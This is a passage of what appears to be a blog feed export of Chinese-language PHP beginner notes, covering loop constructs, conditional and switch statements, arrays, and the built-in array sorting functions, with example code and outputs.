<h2 id="do…while语句"><a href="#do…while语句" class="headerlink" title="do…while语句"></a>do…while语句</h2><p>语法<br><figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">    代码块;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (条件);</span><br></pre></td></tr></table></figure><br>还是类似的例子<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$i=<span class="number">1</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">do</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $i++;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"The number is "</span> . $i . <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">while</span> ($i&lt;=<span class="number">5</span>);</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">The number <span class="keyword">is</span> <span class="number">2</span></span><br><span class="line">The number <span class="keyword">is</span> <span class="number">3</span></span><br><span class="line">The number <span class="keyword">is</span> <span class="number">4</span></span><br><span class="line">The number <span class="keyword">is</span> <span class="number">5</span></span><br><span class="line">The number <span class="keyword">is</span> <span class="number">6</span></span><br></pre></td></tr></table></figure><br>这个例子中将i++与echo调换了顺序来说明do…while循环</p>
<h2 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h2><p>语法<br><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">for (初始值<span class="comment">; 条件; 增量)</span></span><br><span class="line">&#123;</span><br><span class="line">    代码块<span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>与C语言一摸一样<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">for</span> ($i=<span class="number">1</span>; $i&lt;=<span class="number">5</span>; $i++)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"The number is "</span> . $i . <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">The number <span class="keyword">is</span> <span class="number">1</span></span><br><span class="line">The number <span class="keyword">is</span> <span class="number">2</span></span><br><span class="line">The number <span class="keyword">is</span> <span class="number">3</span></span><br><span class="line">The number <span class="keyword">is</span> <span class="number">4</span></span><br><span class="line">The number <span class="keyword">is</span> <span class="number">5</span></span><br></pre></td></tr></table></figure></p>
<h2 id="foreach循环"><a href="#foreach循环" class="headerlink" title="foreach循环"></a>foreach循环</h2><p>语法<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> ($array <span class="keyword">as</span> $value)</span><br><span class="line">&#123;</span><br><span class="line">    代码块;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>每进行一次循环，当前数组元素的值就会被赋值给 $value 变量（数组指针会逐一地移动），在进行下一次循环时，您将看到数组中的下一个值</p>
<p>例如<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$x=<span class="keyword">array</span>(<span class="string">"one"</span>,<span class="string">"two"</span>,<span class="string">"three"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">foreach</span> ($x <span class="keyword">as</span> $value)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $value . <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="literal">one</span></span><br><span class="line"><span class="literal">two</span></span><br><span class="line"><span class="literal">three</span></span><br></pre></td></tr></table></figure></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.$GLOBALS是PHP最常见和常用的超全局变量，我的理解可以将其理解为JAVA中的object类，虽然方法和概念有所不同，但是思路基本一致，都是覆盖了整个编程范围</p>
<p>2.$_SERVER中的项目是由Web服务器创建的，不是所有服务器都包含了全部的项目，是根据服务器进行灵活变动的</p>
<p>3.$_REQUEST主要是用于收集HTML表单提交的内容，默认是post方式</p>
<p>4.$_POST同样应用于收集表单数据，$_GET也一样，只不过两者方式不同，一种是以POST方式接受数据，一种则是以GET的方式来接受数据</p>
<p>5.在编写循环语句时，要注意终止条件是否满足要求，避免出现死循环的现象</p>
<p>6.在事先已经确定好要循环多少次时，使用for循环最佳，不确定时使用while循环配合continue和break来终止循环，foreach循环常用在遍历输出数组上</p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>PHP开发</category>
        <category>基础</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-2020/7/6-基础4</title>
    <url>/2020/07/06/PHP-2020-7-6-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="数组排序"><a href="#数组排序" class="headerlink" title="数组排序"></a>数组排序</h1><p>PHP中内置了PHP数组的排列函数</p>
<ul>
<li>sort() 对数组进行升序排列</li>
<li>rsort() 对数组进行降序排列</li>
<li>asort() 根据关联数组的值，对数组进行升序排列</li>
<li>ksort() 根据关联数组的键，对数组进行升序排列</li>
<li>arsort() 根据关联数组的值，对数组进行降序排列</li>
<li>krsort() 根据关联数组的键，对数组进行降序排列</li>
</ul>
<h2 id="sort"><a href="#sort" class="headerlink" title="sort()"></a>sort()</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$cars=<span class="keyword">array</span>(<span class="string">"Volvo"</span>,<span class="string">"BMW"</span>,<span class="string">"Toyota"</span>);</span></span><br><span class="line"><span class="php">sort($cars);</span></span><br><span class="line"><span class="php">print_r($cars);</span></span><br></pre></td></tr></table></figure>
<p>运行结果为<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; BMW</span><br><span class="line">    [<span class="number">1</span>] =&gt; Toyota</span><br><span class="line">    [<span class="number">2</span>] =&gt; Volvo</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p>
<p>数字也同样类似<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$numbers=<span class="built_in">array</span>(<span class="number">4</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">22</span>,<span class="number">11</span>);</span><br><span class="line">sort($numbers);</span><br><span class="line">print_r($numbers);</span><br></pre></td></tr></table></figure><br>运行结果为<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="number">2</span></span><br><span class="line">    [<span class="number">1</span>] =&gt; <span class="number">4</span></span><br><span class="line">    [<span class="number">2</span>] =&gt; <span class="number">6</span></span><br><span class="line">    [<span class="number">3</span>] =&gt; <span class="number">11</span></span><br><span class="line">    [<span class="number">4</span>] =&gt; <span class="number">22</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure></p>
<h2 id="rsort"><a href="#rsort" class="headerlink" title="rsort()"></a>rsort()</h2><p>rsort就与sort()相反，降序排列，r的意思就是reverse，不过多举例</p>
<h2 id="asort"><a href="#asort" class="headerlink" title="asort()"></a>asort()</h2><p>a就是associative，关联的意思，默认关联值<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$age=<span class="keyword">array</span>(<span class="string">"Peter"</span>=&gt;<span class="string">"35"</span>,<span class="string">"Ben"</span>=&gt;<span class="string">"37"</span>,<span class="string">"Joe"</span>=&gt;<span class="string">"43"</span>);</span></span><br><span class="line"><span class="php">asort($age);</span></span><br><span class="line"><span class="php">print_r($age);</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [Peter] =&gt; <span class="number">35</span></span><br><span class="line">    [Ben] =&gt; <span class="number">37</span></span><br><span class="line">    [Joe] =&gt; <span class="number">43</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure></p>
<h2 id="arsort"><a href="#arsort" class="headerlink" title="arsort()"></a>arsort()</h2><p>与asort()相反<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$age=<span class="keyword">array</span>(<span class="string">"Peter"</span>=&gt;<span class="string">"35"</span>,<span class="string">"Ben"</span>=&gt;<span class="string">"37"</span>,<span class="string">"Joe"</span>=&gt;<span class="string">"43"</span>);</span></span><br><span class="line"><span class="php">arsort($age);</span></span><br><span class="line"><span class="php">print_r($age);</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [Joe] =&gt; <span class="number">43</span></span><br><span class="line">    [Ben] =&gt; <span class="number">37</span></span><br><span class="line">    [Peter] =&gt; <span class="number">35</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure></p>
<h2 id="ksort"><a href="#ksort" class="headerlink" title="ksort()"></a>ksort()</h2><p>k其实就是key，就是键值对里的键<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$age=<span class="keyword">array</span>(<span class="string">"Peter"</span>=&gt;<span class="string">"35"</span>,<span class="string">"Ben"</span>=&gt;<span class="string">"37"</span>,<span class="string">"Joe"</span>=&gt;<span class="string">"43"</span>);</span></span><br><span class="line"><span class="php">ksort($age);</span></span><br><span class="line"><span class="php">print_r($age);</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [Ben] =&gt; <span class="number">37</span></span><br><span class="line">    [Joe] =&gt; <span class="number">43</span></span><br><span class="line">    [Peter] =&gt; <span class="number">35</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><br>这次比较的其实就是键，也就是=&gt;前的内容</p>
<p>按字母大小顺序排列</p>
<h2 id="krsort"><a href="#krsort" class="headerlink" title="krsort()"></a>krsort()</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$age=<span class="keyword">array</span>(<span class="string">"Peter"</span>=&gt;<span class="string">"35"</span>,<span class="string">"Ben"</span>=&gt;<span class="string">"37"</span>,<span class="string">"Joe"</span>=&gt;<span class="string">"43"</span>);</span></span><br><span class="line"><span class="php">krsort($age);</span></span><br><span class="line"><span class="php">print_r($age);</span></span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [Peter] =&gt; <span class="number">35</span></span><br><span class="line">    [Joe] =&gt; <span class="number">43</span></span><br><span class="line">    [Ben] =&gt; <span class="number">37</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><br>参考前面，不过多介绍</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.PHP内置的数组排列函数适用于所有合法的数组</p>
<p>2.r就是reversere,相反的意思，看到PHP函数中开头有r，基本可以确定是以原函数相反的返回结果</p>
<p>3.键值对是常见的存储方式，格式是KEY=&gt;DATA,不能颠倒，KEY与DATA的命名只要符合命名规则，可以随意命名</p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>PHP开发</category>
        <category>基础</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-2020/6/14-基础3</title>
    <url>/2020/06/14/PHP-2020-6-14-%E5%91%A8%E6%8A%A52/</url>
    <content><![CDATA[<h1 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h1><p>在编写代码的时候常常需要为不同判断执行不同的动作<br><figure class="highlight gams"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>语句 -条件成立时执行代码</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">if</span></span>...<span class="keyword">else</span>语句 -条件成立时执行一块代码，条件不成立时执行另一块代码</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">if</span></span>...elseif...<span class="keyword">else</span>语句 -在若干条件之一成立时执行一个代码块</span><br><span class="line"></span><br><span class="line">switch语句 -在若干条件之一成立时执行一个代码块</span><br></pre></td></tr></table></figure></p>
<h2 id="if语句"><a href="#if语句" class="headerlink" title="if语句"></a>if语句</h2><p>语法和C语言类似<br><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">if(条件)&#123;</span><br><span class="line">	代码<span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>例如<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$t=date(<span class="string">"H"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($t&lt;<span class="string">"20"</span>)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"Have a good day!"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><br>如果当前时间小于20，那就输出Have a good day!</p>
<h2 id="if…else语句"><a href="#if…else语句" class="headerlink" title="if…else语句"></a>if…else语句</h2><p>语法<br><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">if (条件)</span><br><span class="line">&#123;</span><br><span class="line">条件成立时执行的代码<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">条件不成立时执行的代码<span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>例如<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$t=date(<span class="string">"H"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($t&lt;<span class="string">"20"</span>)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"Have a good day!"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"Have a good night!"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><br>如果当前时间小于20,就输出Have a good day!，否则就输出Have a good night!</p>
<h2 id="if…elseif…else"><a href="#if…elseif…else" class="headerlink" title="if…elseif…else"></a>if…elseif…else</h2><p>在若干条件之一成立时执行一个代码块</p>
<p>语法<br><figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (条件)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> 条件成立时执行的代码;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (条件)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">elseif</span> 条件成立时执行的代码;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    条件不成立时执行的代码;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>例如<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$t=date(<span class="string">"H"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($t&lt;<span class="string">"10"</span>)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"Have a good morning!"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">elseif</span> ($t&lt;<span class="string">"20"</span>)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"Have a good day!"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"Have a good night!"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><br>如果当前时间小于 10，下面的实例将输出 Have a good morning!，如果当前时间不小于 10 且小于 20，则输出 Have a good day!，否则输出 Have a good night!</p>
<h2 id="switch语句"><a href="#switch语句" class="headerlink" title="switch语句"></a>switch语句</h2><p>switch语句可以说是if…elseif…else的改进，目的是为了更方便的在多条件下执行正确的代码块</p>
<p>语法<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">switch</span> (n)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">case</span> label1:</span></span><br><span class="line"><span class="php">    如果 n=label1，此处代码将执行;</span></span><br><span class="line"><span class="php">    <span class="keyword">break</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">case</span> label2:</span></span><br><span class="line"><span class="php">    如果 n=label2，此处代码将执行;</span></span><br><span class="line"><span class="php">    <span class="keyword">break</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">default</span>:</span></span><br><span class="line"><span class="php">    如果 n 既不等于 label1 也不等于 label2，此处代码将执行;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><br>例如<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$favcolor=<span class="string">"red"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">switch</span> ($favcolor)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">case</span> <span class="string">"red"</span>:</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"你喜欢的颜色是红色!"</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">break</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">case</span> <span class="string">"blue"</span>:</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"你喜欢的颜色是蓝色!"</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">break</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">case</span> <span class="string">"green"</span>:</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"你喜欢的颜色是绿色!"</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">break</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">default</span>:</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"你喜欢的颜色不是 红, 蓝, 或绿色!"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><br>首先对一个简单的表达式 n（通常是变量）进行一次计算。将表达式的值与结构中每个 case 的值进行比较。如果存在匹配，则执行与 case 关联的代码。代码执行后，使用 break 来阻止代码跳入下一个 case 中继续执行。default 语句用于不存在匹配（即没有 case 为真）时执行</p>
<h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><p>数组能够在单个变量中存储多个值<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$cars=<span class="keyword">array</span>(<span class="string">"Volvo"</span>,<span class="string">"BMW"</span>,<span class="string">"Toyota"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"I like "</span> . $cars[<span class="number">0</span>] . <span class="string">", "</span> . $cars[<span class="number">1</span>] . <span class="string">" and "</span> . $cars[<span class="number">2</span>] . <span class="string">"."</span>;</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line">I like Volvo, <span class="keyword">BMW </span><span class="keyword">and </span>Toyota.</span><br></pre></td></tr></table></figure><br>数组就是为了方便遍历数据的产物<br><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="symbol">$cars</span>1=<span class="string">"Volvo"</span>;</span><br><span class="line"><span class="symbol">$cars</span>2=<span class="string">"BMW"</span>;</span><br><span class="line"><span class="symbol">$cars</span>3=<span class="string">"Toyota"</span>;</span><br></pre></td></tr></table></figure><br>例如这样存储数据，那么在定义和调用的时候就会比较麻烦</p>
<h2 id="创建数组"><a href="#创建数组" class="headerlink" title="创建数组"></a>创建数组</h2><p>在PHP中使用<code>array()</code>函数创建数组</p>
<p>数组有三种类型<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">数值数组 -带有数字ID键的数组</span><br><span class="line"></span><br><span class="line">关联数组 -带有指定的键的数组，每个键关联一个值</span><br><span class="line"></span><br><span class="line">多维数组 -包含一个或多个数组的数组</span><br></pre></td></tr></table></figure></p>
<h3 id="count函数"><a href="#count函数" class="headerlink" title="count函数"></a>count函数</h3><p>count函数用于返回数组的长度<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$cars=<span class="keyword">array</span>(<span class="string">"Volvo"</span>,<span class="string">"BMW"</span>,<span class="string">"Toyota"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> count($cars);</span></span><br></pre></td></tr></table></figure><br>运行结果为3</p>
<h3 id="数值数组"><a href="#数值数组" class="headerlink" title="数值数组"></a>数值数组</h3><p>自动分配ID键，总是从0开始<br><figure class="highlight lasso"><table><tr><td class="code"><pre><span class="line">$cars=<span class="built_in">array</span>(<span class="string">"Volvo"</span>,<span class="string">"BMW"</span>,<span class="string">"Toyota"</span>);</span><br></pre></td></tr></table></figure><br>还可以人工分配，也就是指定下标内容<br><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="symbol">$cars</span>[<span class="number">0</span>]=<span class="string">"Volvo"</span>;</span><br><span class="line"><span class="symbol">$cars</span>[<span class="number">1</span>]=<span class="string">"BMW"</span>;</span><br><span class="line"><span class="symbol">$cars</span>[<span class="number">2</span>]=<span class="string">"Toyota"</span>;</span><br></pre></td></tr></table></figure></p>
<h4 id="遍历数值数组"><a href="#遍历数值数组" class="headerlink" title="遍历数值数组"></a>遍历数值数组</h4><p>遍历数组一般用循环语句<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$cars=<span class="keyword">array</span>(<span class="string">"Volvo"</span>,<span class="string">"BMW"</span>,<span class="string">"Toyota"</span>);</span></span><br><span class="line"><span class="php">$arrlength=count($cars);</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">for</span>($x=<span class="number">0</span>;$x&lt;$arrlength;$x++)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $cars[$x];</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Volvo</span></span><br><span class="line"><span class="keyword">BMW</span></span><br><span class="line"><span class="keyword">Toyota</span></span><br></pre></td></tr></table></figure></p>
<h3 id="关联数组"><a href="#关联数组" class="headerlink" title="关联数组"></a>关联数组</h3><p>这里有两种关联数组的方式<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$age=<span class="keyword">array</span>(<span class="string">"Peter"</span>=&gt;<span class="string">"35"</span>,<span class="string">"Ben"</span>=&gt;<span class="string">"37"</span>,<span class="string">"Joe"</span>=&gt;<span class="string">"43"</span>);</span><br></pre></td></tr></table></figure><br>OR<br><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="symbol">$age</span>[<span class="string">'Peter'</span>]=<span class="string">"35"</span>;</span><br><span class="line"><span class="symbol">$age</span>[<span class="string">'Ben'</span>]=<span class="string">"37"</span>;</span><br><span class="line"><span class="symbol">$age</span>[<span class="string">'Joe'</span>]=<span class="string">"43"</span>;</span><br></pre></td></tr></table></figure></p>
<p>例如<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$age=<span class="keyword">array</span>(<span class="string">"Peter"</span>=&gt;<span class="string">"35"</span>,<span class="string">"Ben"</span>=&gt;<span class="string">"37"</span>,<span class="string">"Joe"</span>=&gt;<span class="string">"43"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"Peter is "</span> . $age[<span class="string">'Peter'</span>] . <span class="string">" years old."</span>;</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">Peter <span class="keyword">is</span> <span class="number">35</span> years old.</span><br></pre></td></tr></table></figure></p>
<h4 id="遍历关联数组"><a href="#遍历关联数组" class="headerlink" title="遍历关联数组"></a>遍历关联数组</h4><p>打印关联数组中的所有值可以用foreach循环<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$age=<span class="keyword">array</span>(<span class="string">"Peter"</span>=&gt;<span class="string">"35"</span>,<span class="string">"Ben"</span>=&gt;<span class="string">"37"</span>,<span class="string">"Joe"</span>=&gt;<span class="string">"43"</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">foreach</span>($age <span class="keyword">as</span> $x=&gt;$x_value)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"Key="</span> . $x . <span class="string">", Value="</span> . $x_value;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Key</span>=Peter, <span class="attribute">Value</span>=35</span><br><span class="line"><span class="attribute">Key</span>=Ben, <span class="attribute">Value</span>=37</span><br><span class="line"><span class="attribute">Key</span>=Joe, <span class="attribute">Value</span>=43</span><br></pre></td></tr></table></figure></p>
<h2 id="数组排序"><a href="#数组排序" class="headerlink" title="数组排序"></a>数组排序</h2><p>按字母或者数字顺序降序或升序排列</p>
<h3 id="排列函数"><a href="#排列函数" class="headerlink" title="排列函数"></a>排列函数</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">sort</span><span class="params">()</span></span> - 对数组进行升序排列</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">rsort</span><span class="params">()</span></span> - 对数组进行降序排列</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">asort</span><span class="params">()</span></span> - 根据关联数组的值，对数组进行升序排列</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">ksort</span><span class="params">()</span></span> - 根据关联数组的键，对数组进行升序排列</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">arsort</span><span class="params">()</span></span> - 根据关联数组的值，对数组进行降序排列</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">krsort</span><span class="params">()</span></span> - 根据关联数组的键，对数组进行降序排列</span><br></pre></td></tr></table></figure>
<h4 id="sort-对数组升序排列"><a href="#sort-对数组升序排列" class="headerlink" title="sort -对数组升序排列"></a>sort -对数组升序排列</h4><p>按照字母顺序升序排列<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$cars=<span class="keyword">array</span>(<span class="string">"Volvo"</span>,<span class="string">"BMW"</span>,<span class="string">"Toyota"</span>);</span></span><br><span class="line"><span class="php">sort($cars);</span></span><br><span class="line"><span class="php">print_r($cars);</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; BMW</span><br><span class="line">    [<span class="number">1</span>] =&gt; Toyota</span><br><span class="line">    [<span class="number">2</span>] =&gt; Volvo</span><br><span class="line">)</span><br></pre></td></tr></table></figure><br>按照数字排列<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$numbers=<span class="built_in">array</span>(<span class="number">4</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">22</span>,<span class="number">11</span>);</span><br><span class="line">sort($numbers);</span><br><span class="line">print_r($numbers);</span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="number">2</span></span><br><span class="line">    [<span class="number">1</span>] =&gt; <span class="number">4</span></span><br><span class="line">    [<span 